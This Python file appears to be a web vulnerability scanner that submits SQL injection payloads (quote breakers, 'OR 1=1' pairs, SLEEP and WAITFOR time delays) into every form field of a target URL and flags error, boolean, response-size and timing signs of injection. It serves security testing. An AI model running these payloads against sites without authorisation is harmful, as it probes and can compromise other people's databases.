import requests
import time
from urllib.parse import urljoin
from app.form_parser import get_forms
from functools import lru_cache
from requests.adapters import HTTPAdapter


SQL_ERRORS = [
    "sql syntax",
    "mysql",
    "syntax error",
    "warning",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate",
    "odbc",
    "postgresql",
    "oracle",
    "sqlite",
    "mssql",
    "microsoft ole db",
    "invalid query",
    "division by zero",
    "supplied argument is not a valid",
    "pg_query",
    "pg_exec",
]

# Payloads for error-based detection
ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    "\"",
    "\\",
    "' --",
    "' #",
    "';--",
]

# Boolean-based pairs
BOOLEAN_PAYLOADS = [
    ("' OR '1'='1' --", "' OR '1'='2' --"),
    ("' OR 1=1 --",     "' OR 1=2 --"),
    ("1' OR '1'='1",    "1' OR '1'='2"),
]

# Time-based payloads (MySQL, MSSQL, PostgreSQL, SQLite)
TIME_PAYLOADS = [
    "' OR SLEEP(5) --",
    "'; WAITFOR DELAY '0:0:5' --",
    "' OR pg_sleep(5) --",
    "' OR 1=1; SELECT SLEEP(5) --",
]


def _make_session():
    s = requests.Session()
    s.headers.update({
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
    })
    adapter = HTTPAdapter(pool_connections=20, pool_maxsize=50)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    return s

@lru_cache(maxsize=200)
def get_forms_cached(url):
    return get_forms(url)

session = _make_session()


def _resolve_action(base_url, action):
    """Turn relative form actions into absolute URLs."""
    if not action or action.strip() in ("#", ""):
        return base_url
    return urljoin(base_url, action)


def _send(method, url, data, timeout=10):
    """Send request and return response, or None on failure."""
    try:
        if method == "post":
            return session.post(url, data=data, timeout=timeout, allow_redirects=True)
        else:
            return session.get(url, params=data, timeout=timeout, allow_redirects=True)
    except requests.exceptions.RequestException as e:
        print(f"  [!] Request failed ({url}): {e}")
        return None


def _has_sql_error(text):
    lower = text.lower()
    for error in SQL_ERRORS:
        if error in lower:
            return error
    return None


def _build_data(inputs, target_name=None, payload=None):
    """Build form data dict, optionally injecting a payload into target_name."""
    data = {}
    for i in inputs:
        name = i.get("name")
        if not name:
            continue
        if name == target_name and payload is not None:
            data[name] = payload
        else:
            data[name] = i.get("value") or "test"
    return data


def scan_sqli(url):
    print(f"\n[*] Scanning: {url}")

    vulnerabilities = []
    found_params = set()   # avoid duplicate reports per (action, param, type)

    try:
        forms = get_forms_cached(url)
    except Exception as e:
        print(f"  [!] Could not retrieve forms: {e}")
        return vulnerabilities

    if not forms:
        print("  [-] No forms found.")
        return vulnerabilities

    print(f"  [+] Found {len(forms)} form(s).")

    for form_idx, form in enumerate(forms):
        raw_action = form.get("action") or ""
        action = _resolve_action(url, raw_action)
        method = (form.get("method") or "get").lower().strip()
        inputs = form.get("inputs", [])

        named_inputs = [i for i in inputs if i.get("name")]
        if not named_inputs:
            print(f"  [-] Form {form_idx+1}: no named inputs, skipping.")
            continue

        print(f"\n  [Form {form_idx+1}] action={action} | method={method} | inputs={[i['name'] for i in named_inputs]}")

        # --- Baseline request ---
        baseline_data = _build_data(inputs)
        baseline_resp = _send(method, action, baseline_data)
        if baseline_resp is None:
            print("  [!] Baseline request failed, skipping form.")
            continue
        baseline_len = len(baseline_resp.text)
        print(f"  [*] Baseline → status={baseline_resp.status_code}, len={baseline_len}")

        for target in named_inputs:
            param = target["name"]

            # ── 1. Error-based ──────────────────────────────────────────────
            key = (action, param, "error-based")
            if key not in found_params:
                for payload in ERROR_PAYLOADS:
                    data = _build_data(inputs, param, payload)
                    r = _send(method, action, data)
                    if r is None:
                        continue

                    matched = _has_sql_error(r.text)
                    if matched:
                        print(f"  [VULN] Error-based SQLi → param='{param}' payload='{payload}' matched='{matched}'")
                        vulnerabilities.append({
                            "type": "error-based",
                            "url": action,
                            "parameter": param,
                            "payload": payload,
                            "matched_error": matched,
                        })
                        found_params.add(key)
                        break

            # ── 2. Response-difference (single quote anomaly) ───────────────
            key = (action, param, "response-diff")
            if key not in found_params:
                data = _build_data(inputs, param, "'")
                r = _send(method, action, data)
                if r is not None:
                    diff = abs(len(r.text) - baseline_len)
                    if diff > 200:
                        print(f"  [VULN] Response-diff SQLi → param='{param}' diff={diff}")
                        vulnerabilities.append({
                            "type": "response-diff",
                            "url": action,
                            "parameter": param,
                            "payload": "'",
                            "response_diff": diff,
                        })
                        found_params.add(key)

            # ── 3. Boolean-based ────────────────────────────────────────────
            key = (action, param, "boolean-based")
            if key not in found_params:
                for true_payload, false_payload in BOOLEAN_PAYLOADS:
                    d_true = _build_data(inputs, param, true_payload)
                    d_false = _build_data(inputs, param, false_payload)

                    r_true = _send(method, action, d_true)
                    r_false = _send(method, action, d_false)

                    if r_true is None or r_false is None:
                        continue

                    diff = abs(len(r_true.text) - len(r_false.text))
                    # check that true response differs from baseline (rules out static pages)
                    baseline_diff = abs(len(r_true.text) - baseline_len)

                    if diff > 100 and baseline_diff > 50:
                        print(f"  [VULN] Boolean-based SQLi → param='{param}' true/false diff={diff}")
                        vulnerabilities.append({
                            "type": "boolean-based",
                            "url": action,
                            "parameter": param,
                            "payload": true_payload,
                            "true_false_diff": diff,
                        })
                        found_params.add(key)
                        break

            # ── 4. Time-based ───────────────────────────────────────────────
            key = (action, param, "time-based")
            if key not in found_params:
                for payload in TIME_PAYLOADS:
                    data = _build_data(inputs, param, payload)
                    start = time.time()
                    r = _send(method, action, data, timeout=7)
                    delay = time.time() - start

                    if delay >= 4.5:
                        print(f"  [VULN] Time-based SQLi → param='{param}' payload='{payload}' delay={delay:.2f}s")
                        vulnerabilities.append({
                            "type": "time-based",
                            "url": action,
                            "parameter": param,
                            "payload": payload,
                            "delay_seconds": round(delay, 2),
                        })
                        found_params.add(key)
                        break

    print(f"\n[*] Scan complete. {len(vulnerabilities)} vulnerability(ies) found.")
    return vulnerabilities